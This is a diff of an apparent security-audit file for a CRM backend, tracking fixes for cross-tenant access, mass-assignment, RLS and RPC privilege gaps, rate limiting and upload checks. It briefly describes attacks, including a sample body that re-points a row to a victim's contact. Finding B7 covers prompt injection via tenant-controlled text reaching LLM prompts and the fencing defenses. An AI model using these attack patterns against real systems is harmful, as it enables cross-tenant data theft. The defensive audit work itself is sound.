-> [backend/src/middleware/errorHandler.ts](backend/src/middleware/errorHandler.ts) now returns a generic `"Internal server error"` plus a random `correlationId` on every 500; the underlying `err.message`/`err.stack` are exposed only when `NODE_ENV === 'development'` and are always logged server-side keyed by the correlation ID. The 500 handler no longer leaks Postgres/Supabase internals. **HTTP-verified** (`NODE_ENV=production`): an error path returned a clean `{"error":"Contact not found"}` with no stack/internals.
->
-> **Residue (still open):** a class-grep found **31** route handlers that still do `res.status(4xx).json({ error: error.message })`, echoing Supabase error text on 4xx (validation/constraint names, not stacks). Lower impact than the 500 leak but not swept — a real remaining item.
+**Fix:** drop `xlsx` in favour of `exceljs` for both import and extraction and sanitize parsed objects against prototype pollution; bump `exceljs`/`uuid` to patched majors with a test pass. CI already has a schema-drift workflow ([.github/workflows](.github/workflows)) — **add `npm audit`/Dependabot** so supply-chain drift fails the build (A03 is top-3).
 
-### B5. Cross-tenant write via unscoped `contactId` — **A01:2025** · API1:2023 — ✅ **FIXED 2026-06-24 (RLS migration)**
-> `events.ts` now uses the RLS-enforced user client. The `contacts` UPDATE and `email_drafts` INSERT in `PATCH /events/:id/follow-ups/:contactId` are now constrained by RLS `WITH CHECK`/`USING (user_id = auth.uid())`, so a foreign `contactId` cannot be written even though the handler still lacks an inline `user_id` filter — RLS rejects it. Penetration-tested: cross-tenant writes blocked.
+### B7. Prompt injection via LLM endpoints — **A05:2025 Injection / LLM01** — ✅ **FIXED 2026-06-30 (legacy endpoints now fence DB-derived text; coupled with B2)**
 
-**Original finding (now mitigated):** **Confirmed (2026-06-24)**
-[backend/src/routes/events.ts:1135](backend/src/routes/events.ts#L1135) — `PATCH /events/:id/follow-ups/:contactId`. The event `:id` is ownership-checked by the `router.param('id')` middleware (see B1), **but `contactId` is not**. The handler runs `supabase.from('contacts').update({...}).eq('id', contactId)` (service_role) with **no `user_id` filter** (the send/skip/unskip branches all do this), and inserts `email_drafts` rows referencing the foreign `contactId`.
-**Attack:** an attacker passes one of their *own* event IDs (passes the param check) plus a *victim's* `contactId`, and flips that victim's `follow_up_status` / `last_contacted_at`, or creates draft rows against the foreign contact.
-**Fix:** add `.eq('user_id', req.user!.id)` to every `contacts` update in this handler, and verify the contact is owned by the caller before any write.
+> **Fix applied.** The legacy non-assistant LLM endpoints now route DB-derived free text through `fenceUntrusted(content, kind)` from [assistant/security.ts](backend/src/assistant/security.ts): in `POST /companies/:id/enrich` the company DB-hints block and the Exa web-research block are fenced; in `GET /contacts/:id/insights` the company DB record (shared-table fields) and the contact timeline are fenced. Instruction/JSON-schema text stays outside the fence. Pairs with B2 (PATCH now linkage-gated, so cross-tenant company text can no longer be freely injected). `npx tsc --noEmit` clean.
 
-### B6. Mass-assignment in follow-up update — **A01:2025 / Insecure Design (A06)** — ✅ **FIXED 2026-06-24**
-> `PUT /follow-ups/:id` ([followUps.ts](backend/src/routes/followUps.ts)) now validates the body with a strict allowlist schema (`followUpUpdateSchema` using Zod `.strict()`), exposing only `summary`/`details`/`interaction_type`/`interaction_date`. `contact_id`, `event_id`, `user_id`, and `id` can no longer be mass-assigned. (Belt-and-suspenders: the route is also on the RLS user client now, so a re-point to a foreign contact would additionally be blocked by RLS.)
+Original finding (for reference):
+The assistant now has real defenses ([backend/src/assistant/security.ts](backend/src/assistant/security.ts)):
+- **`sanitiseUserInput`** flags ~11 injection patterns, hard-truncates to 8000 chars, and prepends a SECURITY marker telling the model to treat the text as data.
+- **`fenceUntrusted`** wraps external/DB-derived content (parsed documents, web-search results) in DATA-ONLY delimiters and **strips attacker-supplied copies of the fence markers** so the boundary can't be spoofed/closed early.
+- The system prompt has a SECURITY block these markers reference; the DOCUMENTS section is only included when a document is actually attached.
 
-**Original finding (now fixed):** **Confirmed (2026-06-24)**
-[backend/src/routes/followUps.ts:159](backend/src/routes/followUps.ts#L159) — `PUT /follow-ups/:id` checks `ownsInteraction(...)` then runs `supabase.from('interactions').update(req.body).eq('id', id)` (service_role). The **entire request body is spread into the update with no allowlist / Zod schema**, unlike [interactions.ts:99](backend/src/routes/interactions.ts#L99) which validates with `interactionPatchSchema`.
-**Attack:** an attacker who owns interaction X sends `PUT /follow-ups/X` with `{"contact_id":"<victim-contact>"}` (or `user_id` / `event_id`), re-pointing the row to another tenant's data or corrupting ownership columns.
-**Fix:** validate the body with a strict allowlist Zod schema exposing only the mutable follow-up fields, as `interactions.ts` already does.
+**Residual (real):** the legacy non-assistant LLM endpoints (`GET /contacts/:id/insights`, company briefings/enrichment) concatenate DB-controlled strings into prompts. Because the shared `companies` create/hint path lets any tenant influence company text (B2), a malicious company record can still reach *another* tenant's briefing prompt without going through the assistant's fencing. **Fix B2 first**, then route all DB-derived free text in the legacy endpoints through `fenceUntrusted` too, not just the assistant path.
 
-### B7. Prompt injection via LLM endpoints — **A05:2025 Injection** (LLM01)
-`POST /events/:id/ask` ([events.ts:800](backend/src/routes/events.ts#L800)), `GET /contacts/:id/insights` ([contacts.ts:454](backend/src/routes/contacts.ts#L454)), `/assistant/respond`, and company briefings concatenate user/DB-controlled strings (contact notes, company descriptions, the `question` field, Tavily web results) directly into prompts. Untrusted contact `notes` / company `description` (attacker-controllable via import) can hijack the model's instructions or exfiltrate other context. Combined with B1, AI-mediated cross-tenant data reads are realistic.
-**Fix:** delimit and label untrusted content, instruct the model to treat it as data, and never let one tenant's free text reach another tenant's prompt (fix B1 first).
+> ✅ **`POST /events/:id/ask` removed 2026-06-30.** This legacy unfenced event-Q&A endpoint (which concatenated event/target/Exa text into a prompt) was **dead** — its only client wrapper `askEventQuestion` had zero callers (event-scoped Q&A now goes through the unified assistant `/assistant/respond` + `ExoChatSheet`/`ExoDockBar`). Deleted the route ([events.ts](backend/src/routes/events.ts)) and the `askEventQuestion` wrapper ([api_service.dart](exono/lib/services/api_service.dart)) rather than retrofit fencing onto an unused path. `npx tsc --noEmit` and `flutter analyze` both clean; `ExaService`/`LiteLLMService` imports retained (still used by the company-briefing endpoints).
+
+### B10. File-upload validation — mostly fixed; bucket-listing remains — **A02:2025 / A05:2025** — 🟡 **PARTIAL**
+- ✅ **Image uploads are now validated by magic bytes**, not the client MIME ([utils/imageValidation.ts](backend/src/utils/imageValidation.ts)): SVG/GIF excluded (stored-XSS / decompression risks), 5 MB hard cap, sniffed type only. Used by the card-scan / capture / vision paths.
+- ✅ **Document extraction is DoS-guarded** ([services/document-extraction.ts](backend/src/services/document-extraction.ts)): 15 MB pre-parse cap, 2M-char extracted-text cap, 1000-page PDF cap, magic-byte sniff (no format reaches a parser it wasn't sniffed as).
+- ✅ **`POST /upload` stub removed 2026-06-30.** It accepted any file into memory and returned a fake `https://placeholder.com/...` URL with no validation. Confirmed **dead** — no Flutter caller referenced `/api/upload` (real uploads go via `captures` and `POST /conversations/:id/attachments/upload`). Deleted `routes/upload.ts` and its import/mount in [routes/index.ts](backend/src/routes/index.ts); `npx tsc --noEmit` clean, no remaining references.
+- ✅ **`contact-avatars` bucket listing closed 2026-06-30.** Dropped the broad `"Public read contact avatars"` SELECT policy on `storage.objects` (it granted `public` SELECT over the whole bucket → enabled `LIST`/enumeration, [lint 0025](https://supabase.com/docs/guides/database/database-linter?lint=0025_public_bucket_allows_listing)). The bucket stays `public=true`, so individual avatar **object URLs** (`getPublicUrl`, the only access the Flutter client uses — confirmed by grep: no `.list()` call) are still served directly by storage. Net effect: object-URL access intact, bucket enumeration removed. (Good: `contact-cards` and `chat-attachments` are private.)
 
 ---
 
 ## 🟡 Medium
 
-### B8. CORS fails open when `ALLOWED_ORIGINS` unset — **A10:2025 (failing open)** · A02:2025 — ✅ **FIXED 2026-06-25**
-> [backend/src/server.ts](backend/src/server.ts) now fails **closed** in production: when `NODE_ENV === 'production'` and `ALLOWED_ORIGINS` is empty, browser-origin requests are denied (a startup warning is logged). The empty-allowlist "allow all" path is now gated to non-production only. No-origin requests (mobile/curl) are still allowed by design. `credentials: true` no longer combines with a wildcard origin in prod. **Verification note:** the server was run with `NODE_ENV=production` + a set `ALLOWED_ORIGINS` during pen-testing (so the happy path was exercised), but the *empty-allowlist-denies* branch was reviewed in code, not directly HTTP-exercised — worth a one-line curl check (`Origin:` header, empty `ALLOWED_ORIGINS`) before relying on it.
+### B9. `SECURITY DEFINER` RPCs callable by `anon`/`authenticated` — **A02:2025 Security Misconfiguration** — ✅ **FIXED 2026-06-30 (anon revoked on all 5; authenticated revoked on the 2 server-only funcs)**
 
-### B9. `pgrst_reload_schema` is a public/authenticated SECURITY DEFINER RPC — **A02:2025 Security Misconfiguration**
-`public.pgrst_reload_schema()` is callable by `anon` and `authenticated` via `/rest/v1/rpc/...` as `SECURITY DEFINER` with a mutable `search_path`. Any client with the anon key can trigger schema reloads.
-Remediation: <https://supabase.com/docs/guides/database/database-linter?lint=0028_anon_security_definer_function_executable> — `REVOKE EXECUTE ... FROM anon, authenticated`.
+> **Fix applied & verified (live `pg_proc`/`routine_privileges` query, not the cached advisor).** `REVOKE EXECUTE FROM anon` on all 5 RPCs; additionally `REVOKE EXECUTE FROM authenticated` on `pgrst_reload_schema` + `upsert_scoped_rate_limit` (server-only). The 3 `*_target_company_note` RPCs **keep** `authenticated` (called via `req.supabase` user-client in the notes routes) — their cross-tenant safety still rests on the internal `user_id = p_user_id` check (footgun, tracked). Post-fix grant query returns **only** the 3 note→authenticated grants; zero anon grants remain. *Note:* the Supabase advisor still shows stale anon warnings (cached pre-migration; it even reports the old arg signature) — ground-truth catalog query confirms the revokes landed.
 
-### B10. File upload has no validation; avatar bucket lists publicly — **A02:2025** · A05:2025
-- [backend/src/routes/upload.ts](backend/src/routes/upload.ts) accepts any file into memory and returns a placeholder URL with **no MIME/size/extension validation** (currently a stub — ensure it isn't relied on in prod).
-- Supabase advisor: public bucket **`contact-avatars` allows listing all files** — anyone can enumerate every uploaded avatar. Remediation: <https://supabase.com/docs/guides/database/database-linter?lint=0025_public_bucket_allows_listing>. Tighten the bucket SELECT policy to object-URL access only.
-- CSV/Excel import ([backend/src/routes/import.ts](backend/src/routes/import.ts)) — verify formula-injection sanitization and row caps; note it runs through the vulnerable `xlsx` parser (B3).
+Original finding (for reference):
+Supabase advisor flags **5** `SECURITY DEFINER` functions executable via `/rest/v1/rpc/...` by `anon` and `authenticated` (verified 2026-06-30):
+- `pgrst_reload_schema()` — any anon client can trigger schema reloads (original B9).
+- `upsert_scoped_rate_limit(...)` — backs the rate limiter; takes `p_user_id` as a **parameter** (not `auth.uid()`). An anon caller could write/inflate arbitrary rate-limit rows.
+- `append_target_company_note` / `update_target_company_note` / `delete_target_company_note` — **internally enforce `... and user_id = p_user_id`**, so they cannot cross-tenant *write*. **Attack-verified 2026-06-30:** as `anon`, calling `append_target_company_note(A's-target, B's-user-id, …)` raised `target not found or not owned` — the cross-tenant write was **blocked**. But they take `p_user_id` as a caller-supplied parameter and are exposed to `anon` — unnecessary attack surface and a footgun if the internal check is ever loosened.
 
-### B11. No rate limiting; no abuse logging/alerting; leaked-password protection disabled — **A07:2025 Authentication Failures** · **A09:2025 Security Logging and Alerting Failures**
-- No `express-rate-limit` anywhere. `/auth/login` and `/auth/signup` are open to credential stuffing / brute force; expensive AI/Tavily endpoints are open to cost-abuse (A07).
-- There is request logging ([middleware/logger.ts](backend/src/middleware/logger.ts)) but **no security alerting** on repeated auth failures or anomalous access — A09:2025 explicitly elevates alerting, not just logging.
-- Supabase advisor: **leaked-password protection (HaveIBeenPwned) is disabled** — enable it: <https://supabase.com/docs/guides/auth/password-security>.
+**Chosen fix (2026-06-30): Option A — revoke EXECUTE, scoped per function.** Confirmed by grep that **none of the 5 are called from the Flutter client** (zero `.rpc(` calls in `exono/lib`), so removing `anon` access breaks nothing. But the revoke is **not** a blanket "anon + authenticated on all five" — the call sites differ (verified):
+
+| Function | Called as | Revoke `anon` | Revoke `authenticated` |
+|---|---|---|---|
+| `pgrst_reload_schema` | service_role only ([server.ts:89](backend/src/server.ts#L89)) | ✅ | ✅ |
+| `upsert_scoped_rate_limit` | service_role only ([rateLimit.ts:32](backend/src/utils/rateLimit.ts#L32)) | ✅ | ✅ |
+| `append_target_company_note` | **authenticated** ([events.ts:1329](backend/src/routes/events.ts#L1329)) + service_role ([targets.ts:351](backend/src/assistant/tools/executors/targets.ts#L351)) | ✅ | ❌ **keep** — the notes route calls it as the user |
+| `update_target_company_note` | **authenticated** ([events.ts:1361](backend/src/routes/events.ts#L1361)) | ✅ | ❌ **keep** |
+| `delete_target_company_note` | **authenticated** ([events.ts:1389](backend/src/routes/events.ts#L1389)) | ✅ | ❌ **keep** |
+
+So: `REVOKE EXECUTE FROM anon` on **all 5**; additionally `REVOKE EXECUTE FROM authenticated` on **`pgrst_reload_schema` and `upsert_scoped_rate_limit`** only (those are server-only). The three note functions must keep `authenticated` because the `events.ts` notes routes call them through `req.supabase!` (the user client) — a blanket revoke from `authenticated` would break add/edit/delete note. Their cross-tenant safety still rests on the internal `user_id = p_user_id` check (attack-verified above), so they remain a footgun until refactored. ([lint 0028/0029](https://supabase.com/docs/guides/database/database-linter?lint=0028_anon_security_definer_function_executable))
+
+### B11. Auth-flow rate limiting + alerting still absent — **A07:2025 / A09:2025** — 🟡 **RATE LIMITING FIXED 2026-06-30; alerting + leaked-password toggle still open**
+
+> **Rate limiting applied.** Added `express-rate-limit`. [auth.ts](backend/src/routes/auth.ts) now applies an IP-keyed `authLimiter` (10 / 15 min) to `/login` + `/refresh` and a tighter `signupLimiter` (5 / 60 min) to `/signup`; `/logout`, `/session`, `/complete-profile` are intentionally unlimited. [server.ts:24](backend/src/server.ts#L24) sets `app.set('trust proxy', 1)` so `req.ip` is the real client IP behind Vercel/Firebase. tsc clean for these files. **Caveat (documented in code):** the default store is per-process memory, so on serverless the effective cap is `max × instances` — a hard global cap needs a shared (Redis/Postgres) store; in-memory is a large improvement over nothing as a first pass. **Still open:** (1) **leaked-password protection** (HaveIBeenPwned) is a Supabase **console** toggle — enable at Auth → Password settings ([docs](https://supabase.com/docs/guides/auth/password-security)); not togglable from this repo. (2) **Security alerting** on repeated auth failures / anomalous access (A09) — not implemented.
+
+Original finding (for reference):
+- ✅ **AI / upload abuse is now rate-limited.** The assistant has a persistent per-user limiter (`assistant_rate_limits`, 30/min, [assistant/security.ts](backend/src/assistant/security.ts)) and there is a generic scoped limiter (`scoped_rate_limits`) for image upload (40/min) and doc upload (20/min) ([utils/rateLimit.ts](backend/src/utils/rateLimit.ts)). Both **fail open** on DB error (deliberate availability choice — acceptable, but means a DB outage disables the limit).
+- ❌ **`/auth/login`, `/auth/signup`, `/auth/refresh` have NO rate limiting** — open to credential stuffing / brute force / mass-account-creation. Verified 2026-06-30: all three ([auth.ts:186](backend/src/routes/auth.ts#L186), [:38](backend/src/routes/auth.ts#L38), [:305](backend/src/routes/auth.ts#L305)) go straight to Supabase with only Zod validation; `express-rate-limit` is not a dependency and no rate-limit middleware is applied at the server or auth-router level. The existing `scoped_rate_limits` helper is keyed by `user_id`, so it **cannot** cover pre-login auth (no user yet) — these need an **IP-keyed** limiter.
+
+  **Fix (documented; not yet applied):**
+  1. `npm install express-rate-limit` in `backend/`.
+  2. In [auth.ts](backend/src/routes/auth.ts), add an IP-keyed limiter and apply it **only** to the brute-forceable routes (`/login`, `/signup`, `/refresh`) — NOT `/logout` or `/session`:
+     ```ts
+     import rateLimit from 'express-rate-limit';
+     const authLimiter = rateLimit({
+       windowMs: 15 * 60 * 1000,        // 15 min
+       max: 10,                          // per IP per window (login/refresh)
+       standardHeaders: true, legacyHeaders: false,
+       message: { error: 'Too many attempts, please try again later.' },
+     });
+     // Use authLimiter on /login and /refresh; a tighter limiter (e.g. max 5/hour)
+     // on /signup to curb mass-account-creation.
+     router.post('/login', authLimiter, async (req, res) => { /* ... */ });
+     ```
+  3. In [server.ts](backend/src/server.ts) add `app.set('trust proxy', 1);` — behind Vercel/Firebase, `req.ip` is the proxy IP unless `X-Forwarded-For` is trusted; without this the limiter is bypassable or causes shared-bucket false lockouts.
+  4. **Recommended limits:** login/refresh ~10 per IP / 15 min; signup ~5 per IP / hour.
+  5. **Caveat:** `express-rate-limit`'s default store is per-process memory, so on serverless/multi-instance the effective limit is `max × instances`. For a hard global cap, back it with a shared store (Redis, or a Postgres-backed store mirroring `scoped_rate_limits` but keyed by IP). In-memory is still a large improvement over nothing for a first pass. Supabase Auth's built-in throttling is a backstop, not the primary control.
+- ❌ **No security alerting** on repeated auth failures / anomalous access — the colored request logger ([middleware/logger.ts](backend/src/middleware/logger.ts)) redacts `password`/`token`/`refresh_token` (good) but A09:2025 wants alerting, not just logging.
+- ❌ Supabase advisor: **leaked-password protection (HaveIBeenPwned) is disabled** — enable it ([password-security](https://supabase.com/docs/guides/auth/password-security)).
+
+### B13. `scoped_rate_limits` has RLS enabled but no policy — **A02:2025** — ✅ **FIXED 2026-06-30 (explicit deny-all policy + table comment)**
+
+> **Fix applied & verified.** Added `scoped_rate_limits_deny_all` (`FOR ALL TO authenticated, anon USING(false) WITH CHECK(false)`) + a `COMMENT ON TABLE` recording the deny-all intent. The table is written ONLY via the `SECURITY DEFINER` `upsert_scoped_rate_limit` RPC (which is now also anon-revoked, see B9). `pg_policies` confirms the policy exists. The table is intentionally left non-`FORCE`d (deny-all bookkeeping exception, consistent with B14).
+
+Original finding (for reference):
+Advisor lint `rls_enabled_no_policy`: `public.scoped_rate_limits` has RLS on but **zero policies**, so the `authenticated`/`anon` roles can neither read nor write it directly (deny-by-default). That's actually *safe* for confidentiality — but it's load-bearing only because all access goes through the `SECURITY DEFINER` `upsert_scoped_rate_limit` RPC (which bypasses RLS). The deny-all is currently *implicit* (looks like a forgotten policy), so the real risk is a future "fix the lint" migration adding a permissive policy and accidentally exposing the table.
+
+**Chosen fix (2026-06-30): Option 2 — explicit deny policy.** Add a policy that grants nothing (so the table visibly *has* a policy and the lint clears, while still admitting no user), plus a comment recording the intent:
+```sql
+-- Deny-all by design. The table is written ONLY by the SECURITY DEFINER
+-- upsert_scoped_rate_limit RPC (which bypasses RLS). This explicit policy
+-- exists so the table clearly has a policy and nobody "fixes the linter"
+-- by adding a permissive one.
+CREATE POLICY scoped_rate_limits_deny_all
+  ON public.scoped_rate_limits
+  FOR ALL
+  TO authenticated, anon
+  USING (false)
+  WITH CHECK (false);
+
+COMMENT ON TABLE public.scoped_rate_limits IS
+  'Deny-all by design (see scoped_rate_limits_deny_all policy). Accessed only via the SECURITY DEFINER upsert_scoped_rate_limit RPC. Do NOT add a permissive policy.';
+```
+`USING (false)` blocks all reads/updates/deletes; `WITH CHECK (false)` blocks all inserts — for the `authenticated`/`anon` roles only (service_role and the DEFINER RPC are unaffected). Pairs with B9: also `REVOKE EXECUTE ... FROM anon` on `upsert_scoped_rate_limit` so the whole table+function stays strictly server-side.
+
+### B14. Three tenant-adjacent tables are RLS-enabled but NOT `FORCE`d — **A02:2025 / defense-in-depth** — ✅ **FIXED 2026-06-30 (FORCE applied to the 4 tables)**
+
+> **Fix applied & verified.** `FORCE ROW LEVEL SECURITY` set on `assistant_pending_actions`, `document_chunks`, `follow_ups`, `target_company_met`. Post-fix the no-FORCE sweep returns only `scoped_rate_limits` (the deliberate deny-all exception, B13). No legitimate path breaks (service_role is exempt even under FORCE; the pre-flight policy-coverage check in this finding held).
+
+Original finding (for reference):
+Verified 2026-06-30 — these have `relrowsecurity=true` but `relforcerowsecurity=false`, meaning the **table owner bypasses RLS** (a defense-in-depth gap; the service_role paths already bypass RLS anyway, but `FORCE` is the standing invariant the audit framework checks):
+- `assistant_pending_actions` (only a SELECT policy exists)
+- `document_chunks` (RAG chunk store — INSERT/SELECT/DELETE policies)
+- `follow_ups`, `target_company_met`, `scoped_rate_limits` (the last has no policy — see B13)
+
+**Pre-flight check done (2026-06-30) — FORCE is safe on all four; no legitimate path breaks.** Verified each table's policies vs. the client the backend actually uses to write it (service_role is exempt even under FORCE; only non-service_role/user-client paths must be policy-covered):
+
+| Table | Policies | Backend access | FORCE safe? |
+|---|---|---|---|
+| `assistant_pending_actions` | **SELECT only** (`pending_actions_select_own`) | **100% `supabaseAdmin`** — all reads+writes ([assistant.ts:339/391/431/454](backend/src/routes/assistant.ts#L339), [loop.ts:277](backend/src/assistant/loop.ts#L277), [conversations.ts:186](backend/src/routes/conversations.ts#L186)); the app never touches it via a user client, so the missing write policies are irrelevant | ✅ yes |
+| `document_chunks` | full CRUD, `user_id = auth.uid()` | insert via `supabaseAdmin` ([conversations.ts:348](backend/src/routes/conversations.ts#L348)); user-client reads covered by the SELECT policy | ✅ yes |
+| `follow_ups` | full CRUD, `user_id = auth.uid()` | `req.supabase` (routes/services) + `supabaseAdmin` (assistant executors) — user-client writes fully covered by INSERT/UPDATE/DELETE policies | ✅ yes |
+| `target_company_met` | full CRUD, `user_id = auth.uid()` | `req.supabase` ([events.ts:393/975/1420](backend/src/routes/events.ts#L393)) — fully covered | ✅ yes |
+
+Note the one I'd flagged as risky (`assistant_pending_actions`, SELECT-only) is in fact the *safest* — it's never accessed through a user client, so FORCE constrains nothing the app relies on.
+
+**Fix (documented; not yet applied):**
+```sql
+ALTER TABLE public.assistant_pending_actions FORCE ROW LEVEL SECURITY;
+ALTER TABLE public.document_chunks           FORCE ROW LEVEL SECURITY;
+ALTER TABLE public.follow_ups                FORCE ROW LEVEL SECURITY;
+ALTER TABLE public.target_company_met        FORCE ROW LEVEL SECURITY;
+```
+(Skip `scoped_rate_limits` per B13's deny-all approach.) After applying, re-run the no-FORCE sweep from the framework section — it must return empty.
+
+### B15. `vector` extension installed in `public` schema — **A02:2025** — ✅ **FIXED 2026-06-30 (moved to `extensions` schema; RAG smoke-tested)**
+
+> **Fix applied & verified.** Created `extensions` schema (granted USAGE to authenticated/anon/service_role), `ALTER EXTENSION vector SET SCHEMA extensions`, re-pinned `match_document_chunks` search_path to `'public','extensions','pg_temp'`, and `NOTIFY pgrst`. Post-fix `pg_extension` shows `vector` in `extensions`. **RAG smoke test:** calling `match_document_chunks(..., zero-vector, 5)` executes without error (the `<=>` operator still resolves after the move) — returns 0 rows on the currently-empty chunk store, proving operator resolution, not data.
+
+Original finding (for reference):
+Advisor lint `extension_in_public`: `vector` (pgvector **0.8.0**, in `public`) backs the `document_chunks` RAG store. Mixing a third-party extension's objects (the `vector` type, its `<=>` operators/functions) into the shared `public` schema is a hygiene/hardening gap ([lint 0014](https://supabase.com/docs/guides/database/database-linter?lint=0014_extension_in_public)).
+
+**Dependency surface (verified 2026-06-30 — this is why it's NOT a blind one-liner):**
+- **1 column:** `document_chunks.embedding vector(768)` uses the type.
+- **1 function:** `match_document_chunks(... p_query_embedding vector ...)` ([documents.ts:40](backend/src/assistant/tools/executors/documents.ts#L40) calls it) uses the `<=>` distance operator and pins `SET search_path = 'public', 'pg_temp'` — it does **not** currently include an `extensions` schema. **If `vector`/`<=>` move out of `public`, this function stops resolving the operator and RAG retrieval silently breaks.**
+- App code only touches pgvector via that RPC + the `embedding` column write ([conversations.ts:346](backend/src/routes/conversations.ts#L346)); no raw `<=>` in TypeScript. No SQL migration files in the repo — schema is managed directly on Supabase, so this is a manual migration.
+
+**Fix (documented; not yet applied) — move the extension AND update every dependent's search_path in one migration:**
+```sql
+-- 1. Dedicated schema for extensions
+CREATE SCHEMA IF NOT EXISTS extensions;
+GRANT USAGE ON SCHEMA extensions TO authenticated, anon, service_role;
+
+-- 2. Relocate pgvector (type, operators, functions move with it)
+ALTER EXTENSION vector SET SCHEMA extensions;
+
+-- 3. Re-pin match_document_chunks so it still finds the vector operators.
+--    Recreate it (its body is search_path-sensitive for the `<=>` operator):
+ALTER FUNCTION public.match_document_chunks(uuid, uuid, vector, integer)
+  SET search_path = 'public', 'extensions', 'pg_temp';
+
+-- 4. Reload PostgREST so the API picks up the moved type
+NOTIFY pgrst, 'reload schema';
+```
+**Verify after:** the advisor `extension_in_public` lint clears; `match_document_chunks` still returns rows for a real attachment (RAG smoke test); the `document_chunks.embedding` column type still resolves. **Pre-flight caution:** `ALTER EXTENSION ... SET SCHEMA` on an in-use extension can fail if any object can't be relocated — test on a Supabase branch first. Low security impact, so sequence it deliberately rather than rushing.
+
+### B16. `function_search_path_mutable` on two functions — **A02:2025** — ✅ **FIXED 2026-06-30 (search_path pinned on both)**
+
+> **Fix applied & verified.** `ALTER FUNCTION ... SET search_path = pg_catalog, public` on `pgrst_reload_schema()` and `follow_ups_set_updated_at()`. Post-fix `pg_proc.proconfig` shows `search_path=pg_catalog, public` on both. No behavioural change.
+
+Original finding (for reference):
+Advisor lint 0011. Verified 2026-06-30 — both have `proconfig = null` (no pinned `search_path`), so they inherit the caller's path and a referenced name (`now()`, etc.) could in principle be hijacked by an object earlier in the path:
+- **`pgrst_reload_schema()`** — `SECURITY DEFINER` (runs with elevated privilege → higher impact if a referenced object is hijacked). Body is just `NOTIFY pgrst, 'reload schema'`.
+- **`follow_ups_set_updated_at()`** — a `BEFORE UPDATE` trigger function (`plpgsql`, not DEFINER) that calls `now()` and sets `new.updated_at`.
+
+(Confirmed the siblings are already safe: `upsert_scoped_rate_limit`, `match_document_chunks`, and the three `*_target_company_note` RPCs all pin `search_path`.)
+
+**Fix (documented; not yet applied) — pin the path on both:**
+```sql
+ALTER FUNCTION public.pgrst_reload_schema()       SET search_path = pg_catalog, public;
+ALTER FUNCTION public.follow_ups_set_updated_at() SET search_path = pg_catalog, public;
+```
+`pg_catalog` first guarantees built-ins (`now()`, `NOTIFY` internals) resolve to the real ones regardless of caller path. Safe, instant, no behavioural change — the trigger and the reload still work identically. **Verify after:** advisor lint 0011 clears for both; a `follow_ups` UPDATE still stamps `updated_at`. (If B9's revoke + a later DEFINER→INVOKER refactor touches `pgrst_reload_schema`, re-apply the pin in the new definition.)
 
 ---
 
-# Security headers & baseline posture (reviewed 2026-06-24)
+## ✅ Backend findings now CLOSED (re-verified 2026-06-30)
 
-Focused review of HTTP response headers and deployment hardening. **Overall: the API backend's header baseline is good; the served web frontend has none.**
+| ID | Finding | Verification |
+|---|---|---|
+| **B1 / R-01** | IDOR on `GET /contacts/:id/timeline` & sub-resources | `contacts.ts` has `router.param('id')` ownership guard ([contacts.ts:46](backend/src/routes/contacts.ts#L46)) + uses `req.supabase` (RLS). `events.ts` likewise. |
+| **B4** | 500 error handler leaked Postgres/Supabase internals | [errorHandler.ts](backend/src/middleware/errorHandler.ts) returns generic `"Internal server error"` + correlation ID; details only in `development`. |
+| **B5** | Cross-tenant write via unscoped `contactId` in follow-ups | `events.ts` on `req.supabase`; RLS `WITH CHECK` blocks foreign writes. |
+| **B6** | Mass-assignment in `PUT /follow-ups/:id` | `followUpUpdateSchema` with Zod `.strict()` ([followUps.ts:12](backend/src/routes/followUps.ts#L12)) + RLS user client. |
+| **B8** | CORS failed open when `ALLOWED_ORIGINS` unset | [server.ts](backend/src/server.ts) fails **closed** in production; dev-only allow-all. |
+| **B12** | `contact_events` `{public}` allow-all policy | Dropped; permissive-policy sweep returns **empty** (verified 2026-06-30). |
+| **R-02** | Cross-tenant event-name leak + capture cross-link | `captures.ts` adds `.eq('user_id', userId)` + explicit `event_id` ownership precheck ([captures.ts:135](backend/src/routes/captures.ts#L135)). |
+| **R-04** | Body-supplied FK cross-link on event/contact link routes | Explicit FK ownership prechecks added; `documents.ts`/`attachments.ts` use `ownsContact`. |
+| **H2** | CSV export formula injection | [export.ts](backend/src/routes/export.ts) quotes every field (doubles `"`) + prefixes `= + - @`/tab/CR with `'`. |
 
-## 🟢 API backend headers — solid baseline (no change needed)
-[backend/src/server.ts:21](backend/src/server.ts#L21) uses `app.use(helmet())` with **helmet 8.2.0** ([package.json](backend/package.json)) and no overrides. Helmet 8 defaults set a strong set of headers on every API response:
-- `Content-Security-Policy: default-src 'self'; base-uri 'self'; font-src 'self' https: data:; form-action 'self'; frame-ancestors 'self'; img-src 'self' data:; object-src 'none'; script-src 'self'; script-src-attr 'none'; style-src 'self' https: 'unsafe-inline'; upgrade-insecure-requests`
-- `Strict-Transport-Security: max-age=...; includeSubDomains`
-- `X-Content-Type-Options: nosniff`, `X-Frame-Options: SAMEORIGIN` + CSP `frame-ancestors 'self'`
-- `Referrer-Policy: no-referrer`, `Cross-Origin-Opener-Policy: same-origin`, `Origin-Agent-Cluster: ?1`, `X-DNS-Prefetch-Control`, `X-Download-Options`, `X-Permitted-Cross-Domain-Policies`
+**Assistant (AI agent) — reviewed, defenses verified:**
+- Write tools run on `supabaseAdmin` (RLS bypassed by design) but **enforce ownership in code**: `resolve*Id` filter by `user_id`; `assertOwnsEvent/Contact/Attachment` guard raw FK use ([assistant/tools/resolvers.ts](backend/src/assistant/tools/resolvers.ts)); `stripImmutable` + `IMMUTABLE_FIELDS` prevent LLM mass-assignment of `user_id`/`id`.
+- **All write tools are gated behind a user-permission card** (`WRITE_TOOL_NAMES` pauses the loop → `assistant_pending_actions` → `/resume`). A write tool missing from this set would execute without consent — the checklist in [backend/CLAUDE.md](backend/CLAUDE.md) enforces it; the CI drift-check catches unclassified writable-table columns.
+- **`parse_document`** is a READ tool; ownership walks attachment → message → `user_id`; oversized retrieval uses `match_document_chunks` scoped to BOTH `p_user_id` AND `p_attachment_id` (can't reach another user's/document's chunks).
+- **Slayer read path** ([services/slayer-client.ts](backend/src/services/slayer-client.ts)): model allowlist (`ALLOWED_MODELS`), `user_id` ownership + `deleted_at` filters auto-injected (flags auto-derived from live schema at boot via `introspect_public_columns()`), hallucinated `user_id` filters stripped, Slayer connects read-only with RLS as a second check.
+- **No SSRF** in the outbound paths reviewed: Exa search posts to a fixed `https://api.exa.ai/search` ([services/exa-service.ts](backend/src/services/exa-service.ts)); LiteLLM/Gemini use configured base URLs; no user-supplied URL is fetched server-side (enrichment uses Exa, not a raw `website` fetch).
 
